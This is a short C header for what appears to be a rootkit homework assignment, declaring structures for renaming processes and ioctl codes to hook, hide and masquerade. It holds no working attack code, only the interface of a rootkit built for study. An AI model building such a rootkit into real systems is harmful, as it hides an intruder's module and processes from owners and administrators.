#ifndef __ROOTKIT_HW2_H
#define __ROOTKIT_HW2_H

#define MASQ_LEN	16
struct masq_proc {
	char new_name[MASQ_LEN];
	char orig_name[MASQ_LEN];
};

struct masq_proc_req {
	size_t len;
	struct masq_proc *list;
};

#define IOCTL_MOD_HOOK 100
#define IOCTL_MOD_HIDE 200
#define IOCTL_MOD_MASQ 300

#endif /* __ROOTKIT_HW2_H */
